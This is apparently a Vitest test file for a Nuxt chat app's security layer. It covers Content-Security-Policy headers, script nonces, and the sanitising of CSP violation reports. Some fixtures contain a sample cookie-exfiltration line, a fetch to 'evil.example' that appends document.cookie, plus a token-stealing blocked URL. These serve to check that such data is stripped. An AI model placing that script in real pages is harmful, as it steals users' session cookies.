import { describe, expect, it } from 'vitest'
import {
  addNonceToScriptTags,
  htmlSecurityHeaders,
  normalizeCspReportPayload,
  shouldAcceptCspReport
} from '../../server/utils/security-headers'
import { handleCspReportPayload } from '../../server/utils/csp-report-handler'
import { InMemoryCspTelemetryStore } from '../../server/utils/csp-telemetry-store'

describe('Nuxt HTML security headers', () => {
  it('defines deployment security headers with a script nonce for rendered HTML responses', () => {
    const headers = htmlSecurityHeaders({
      scriptNonce: 'nonce-test-123',
      connectSources: ['https://api.discord-clone.local', 'wss://rtc.discord-clone.local']
    })

    expect(headers['Content-Security-Policy']).toContain("default-src 'self'")
    expect(headers['Content-Security-Policy']).toContain("frame-ancestors 'none'")
    expect(headers['Content-Security-Policy']).toContain("style-src 'self'")
    expect(headers['Content-Security-Policy']).not.toContain("style-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain("script-src 'self' 'nonce-nonce-test-123'")
    expect(headers['Content-Security-Policy']).not.toContain("script-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain('ws://127.0.0.1:*')
    expect(headers['Content-Security-Policy']).toContain('https://api.discord-clone.local')
    expect(headers['Content-Security-Policy']).toContain('wss://rtc.discord-clone.local')
    expect(headers['X-Content-Type-Options']).toBe('nosniff')
    expect(headers['X-Frame-Options']).toBe('DENY')
    expect(headers['Referrer-Policy']).toBe('no-referrer')
    expect(headers['Permissions-Policy']).toBe('camera=(), microphone=(self), geolocation=()')
  })

  it('adds the matching nonce to rendered script tags without duplicating existing nonces', () => {
    const html = [
      '<script>window.__NUXT__={}</script>',
      '<script type="module" src="/_nuxt/entry.js"></script>',
      '<script nonce="already-set">console.log("kept")</script>'
    ]

    const secured = addNonceToScriptTags(html, 'nonce-test-123')

    expect(secured[0]).toBe('<script nonce="nonce-test-123">window.__NUXT__={}</script>')
    expect(secured[1]).toBe('<script nonce="nonce-test-123" type="module" src="/_nuxt/entry.js"></script>')
    expect(secured[2]).toBe('<script nonce="already-set">console.log("kept")</script>')
  })

  it('adds CSP report endpoints and a stricter report-only style policy without weakening script nonce policy', () => {
    const headers = htmlSecurityHeaders({
      scriptNonce: 'nonce-test-123',
      connectSources: ['https://api.discord-clone.local'],
      cspReporting: {
        enforceEndpoint: '/api/security/csp-report',
        reportOnlyEndpoint: '/api/security/csp-report-only'
      }
    })

    expect(headers['Content-Security-Policy']).toContain("script-src 'self' 'nonce-nonce-test-123'")
    expect(headers['Content-Security-Policy']).not.toContain("script-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain("style-src 'self'")
    expect(headers['Content-Security-Policy']).not.toContain("style-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain('report-to csp-endpoint')
    expect(headers['Content-Security-Policy']).toContain('report-uri /api/security/csp-report')
    expect(headers['Content-Security-Policy-Report-Only']).toContain("style-src 'self'")
    expect(headers['Content-Security-Policy-Report-Only']).not.toContain("style-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy-Report-Only']).toContain('report-to csp-report-only')
    expect(headers['Reporting-Endpoints']).toBe(
      'csp-endpoint="/api/security/csp-report", csp-report-only="/api/security/csp-report-only"'
    )
  })

  it('normalizes classic CSP reports while stripping sensitive URLs and samples', () => {
    const normalized = normalizeCspReportPayload(JSON.stringify({
      'csp-report': {
        'document-uri': 'https://app.discord-clone.local/channels/general?token=secret',
        'blocked-uri': 'https://evil.example/steal?authorization=Bearer%20secret',
        'violated-directive': "script-src 'self'",
        'effective-directive': 'script-src',
        disposition: 'enforce',
        'script-sample': 'fetch("https://evil.example?cookie=" + document.cookie)',
        referrer: 'https://app.discord-clone.local/login?access_token=secret'
      }
    }), {
      requestId: 'req-csp-1',
      userAgent: 'Mozilla/5.0 secret browser'
    })

    expect(normalized.accepted).toBe(true)
    expect(normalized.report).toMatchObject({
      requestId: 'req-csp-1',
      documentUriOrigin: 'https://app.discord-clone.local',
      blockedUriOrigin: 'https://evil.example',
      violatedDirective: "script-src 'self'",
      effectiveDirective: 'script-src',
      disposition: 'enforce'
    })
    expect(normalized.report?.userAgentHash).toMatch(/^[a-f0-9]{64}$/)
    expect(JSON.stringify(normalized)).not.toContain('secret')
    expect(JSON.stringify(normalized)).not.toContain('document.cookie')
  })

  it('normalizes Reporting API arrays and rejects oversized or unsupported report bodies', () => {
    const normalized = normalizeCspReportPayload(JSON.stringify([
      {
        type: 'csp-violation',
        url: 'https://app.discord-clone.local/@me?session=secret',
        body: {
          blockedURL: 'inline',
          violatedDirective: 'style-src',
          effectiveDirective: 'style-src',
          disposition: 'report',
          sample: 'color:red'
        }
      }
    ]), {
      requestId: 'req-csp-2',
      userAgent: 'Playwright'
    })

    expect(normalized.accepted).toBe(true)
    expect(normalized.report).toMatchObject({
      requestId: 'req-csp-2',
      documentUriOrigin: 'https://app.discord-clone.local',
      blockedUriOrigin: 'inline',
      violatedDirective: 'style-src',
      effectiveDirective: 'style-src',
      disposition: 'report'
    })
    expect(shouldAcceptCspReport('application/csp-report', '{"ok":true}')).toBe(true)
    expect(shouldAcceptCspReport('text/plain', '{"ok":true}')).toBe(false)
    expect(shouldAcceptCspReport('application/json', 'x'.repeat(16_385))).toBe(false)
    expect(normalizeCspReportPayload('{not-json', { requestId: 'req-csp-3', userAgent: '' }).accepted).toBe(false)
  })

  it('handles CSP report endpoint payloads with safe no-content responses', () => {
    const result = handleCspReportPayload({
      body: JSON.stringify({
        'csp-report': {
          'document-uri': 'https://app.discord-clone.local/',
          'blocked-uri': 'inline',
          'violated-directive': 'style-src',
          'effective-directive': 'style-src',
          disposition: 'report'
        }
      }),
      contentType: 'application/csp-report',
      requestId: 'req-csp-4',
      userAgent: 'Playwright'
    })

    expect(result.statusCode).toBe(204)
    expect(result.accepted).toBe(true)
    expect(result.report?.blockedUriOrigin).toBe('inline')

    const rejected = handleCspReportPayload({
      body: 'x'.repeat(16_385),
      contentType: 'application/json',
      requestId: 'req-csp-5',
      userAgent: 'Playwright'
    })

    expect(rejected.statusCode).toBe(204)
    expect(rejected.accepted).toBe(false)
    expect(rejected.report).toBeUndefined()
  })

  it('persists accepted CSP telemetry without storing rejected or raw sensitive payloads', () => {
    const store = new InMemoryCspTelemetryStore({ maxEntries: 10 })
    const result = handleCspReportPayload({
      body: JSON.stringify({
        'csp-report': {
          'document-uri': 'https://app.discord-clone.local/channels/general?token=secret',
          'blocked-uri': 'https://evil.example/steal?authorization=secret',
          'violated-directive': 'style-src',
          'effective-directive': 'style-src',
          disposition: 'report',
          'script-sample': 'document.cookie'
        }
      }),
      contentType: 'application/csp-report',
      requestId: 'req-csp-telemetry-1',
      userAgent: 'Sensitive Browser'
    }, {
      telemetryStore: store,
      now: () => new Date('2026-05-18T00:00:00.000Z')
    })

    handleCspReportPayload({
      body: 'x'.repeat(16_385),
      contentType: 'application/json',
      requestId: 'req-csp-telemetry-2',
      userAgent: 'Sensitive Browser'
    }, {
      telemetryStore: store,
      now: () => new Date('2026-05-18T00:00:01.000Z')
    })

    expect(result.accepted).toBe(true)
    expect(store.recent()).toHaveLength(1)
    expect(store.recent()[0]).toMatchObject({
      receivedAt: '2026-05-18T00:00:00.000Z',
      report: {
        requestId: 'req-csp-telemetry-1',
        documentUriOrigin: 'https://app.discord-clone.local',
        blockedUriOrigin: 'https://evil.example',
        effectiveDirective: 'style-src'
      }
    })
    expect(store.summary()).toEqual({
      total: 1,
      byEffectiveDirective: {
        'style-src': 1
      }
    })
    expect(JSON.stringify(store.recent())).not.toContain('secret')
    expect(JSON.stringify(store.recent())).not.toContain('document.cookie')
  })
})
